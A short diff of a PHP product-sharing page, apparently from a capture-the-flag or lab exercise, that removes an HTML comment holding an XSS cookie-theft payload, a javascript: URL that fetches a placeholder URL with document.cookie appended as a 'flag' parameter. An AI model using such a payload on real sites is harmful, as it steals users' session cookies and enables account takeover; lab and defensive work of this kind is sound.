@@ -80,8 +80,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 <body>
     <h1>Share a Product</h1>
 
-    <!-- javascript&#58;fetch(`URL?flag=`+document.cookie) -->
-
     <?php if (isset($_GET['error'])): ?>
         <p style="background-color: #f8d7da; color: #721c24; padding: 10px; border-radius: 5px;">
             <?= htmlspecialchars($_GET['error']) ?>
